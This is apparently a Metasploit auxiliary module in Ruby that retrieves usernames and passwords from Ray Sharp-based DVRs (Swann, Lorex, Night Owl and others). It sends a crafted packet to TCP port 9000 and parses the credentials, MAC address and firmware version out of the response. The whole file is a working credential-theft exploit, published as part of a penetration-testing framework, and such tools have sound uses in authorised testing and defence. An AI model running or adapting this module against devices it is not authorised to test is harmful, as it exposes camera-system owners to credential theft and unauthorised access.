##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Ray Sharp DVR Password Retriever',
      'Description' => %q{
          This module takes advantage of a protocol design issue with the
        Ray Sharp based DVR systems. It is possible to retrieve the username and
        password through the TCP service running on port 9000. Other brands using
        this platform and exposing the same issue may include Swann, Lorex,
        Night Owl, Zmodo, URMET, and KGuard Security.
      },
      'Author'      =>
        [
          'someluser', # Python script
          'hdm'        # Metasploit module
        ],
      'References'  =>
        [
          [ 'URL', 'http://console-cowboys.blogspot.com/2013/01/swann-song-dvr-insecurity.html' ]
        ],
      'License'     => MSF_LICENSE
    )

    register_options( [ Opt::RPORT(9000) ])
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    req =
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0E\x0F" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00" +
      ( "\x00" * 475 )

    connect
    sock.put(req)

    buf = ""
    begin
      # Pull data until the socket closes or we time out
      Timeout.timeout(15) do
        loop do
          res = sock.get_once(-1, 1)
          buf << res if res
        end
      end
    rescue ::Timeout::Error
    rescue ::EOFError
    end

    disconnect

    info = ""
    mac  = nil
    ver  = nil

    creds = {}

    buf.scan(/[\x00\xff]([\x20-\x7f]{1,32})\x00+([\x20-\x7f]{1,32})\x00\x00([\x20-\x7f]{1,32})\x00/m).each do |cred|
      # Make sure the two passwords match
      next unless cred[1] == cred[2]
      creds[cred[0]] = cred[1]
    end

    if creds.keys.length > 0
      creds.keys.sort.each do |user|
        pass = creds[user]
        report_cred(
          ip: rhost,
          port: rport,
          service_name: 'dvr',
          user: user,
          password: pass,
          proof: pass
        )
        info << "(user='#{user}' pass='#{pass}') "
      end
    end

    # Look for MAC address
    if buf =~ /([0-9A-F]{2}\-[0-9A-F]{2}\-[0-9A-F]{2}\-[0-9A-F]{2}\-[0-9A-F]{2}\-[0-9A-F]{2})/mi
      mac = $1
    end

    # Look for version
    if buf =~ /(V[0-9]+\.[0-9][^\x00]+)/m
      ver = $1
    end

    info << "mac=#{mac} " if mac
    info << "version=#{ver} " if ver

    return unless (creds.keys.length > 0 or mac or ver)

    report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => info)
    print_good("#{rhost}:#{rport} #{info}")
  end
end
